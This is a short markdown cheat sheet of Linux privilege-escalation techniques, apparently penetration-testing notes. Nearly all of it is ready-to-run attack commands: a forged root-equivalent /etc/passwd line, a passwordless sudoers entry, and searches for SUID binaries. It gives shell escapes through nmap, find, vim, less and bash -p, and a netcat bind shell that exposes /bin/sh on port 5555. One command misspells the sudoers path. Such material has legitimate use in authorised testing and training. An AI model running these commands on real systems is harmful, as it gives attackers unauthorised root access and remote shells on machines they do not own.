# Linux Privilege Escalation
## Does the User have SUDO permissions?
Check Sudo Access  
`sudo -l`

## Any writable "system" files?
```
/etc/passwd
/etc/shadow
/etc/crontab
```
## Creating password hashes for /etc/passwd  or /etc/shadow
 
  ```
  openssl passwd -6 -salt xyz  yourpass
  -1 MD5
  -5 SHA256
  -6 SHA512
  ```  
## Sample root2:testing user for /etc/passwd
  ```
  root2:KWi2XW05LmkMg:0:0:root:/root:/bin/bash
  ```
## Adding user to suoders file
```
user     ALL=(ALL:ALL) NOPASSWD:ALL
``` 
## SUID Based Privilge Escalation  
### Locating SUIDS
`find . -perm /4000 2>/dev/null`  
`find / -user root -perm -4000 -print 2>/dev/null`  
`find / -perm -u=s -type f 2>/dev/null`  
`find / -user root -perm -4000 -exec ls -ldb {} \;`  

### Exploiting SUIDs

nmap 2.02 - 5.21  
`nmap -V #version check`  

```
nmap --interactive  
nmap> !sh
```

find  
`find <file> -exec <CMD> \;`  
Escalation to root shell  
`find . -exec /bin/sh -p \; -quit`  
`find somefile -exec netcat -lvp 5555 -e /bin/sh \;`  
`find somefile -exec echo "lowprivuser ALL=(ALL) NOPASSWD:ALL" > /etc/sodoers \;`  
Vim  
```
vim /etc/shadow  
vim  
# Press ESC key  
:set shell=/bin/sh  
:shell
```

bash  
`bash -p`

less  
```
less /etc/passwd  
!/bin/sh
```
**Command reference for privilege escalation using SUIDS and SUDO**  
https://gtfobins.github.io/

## Kernel Exploits  
https://github.com/lucyoa/kernel-exploits

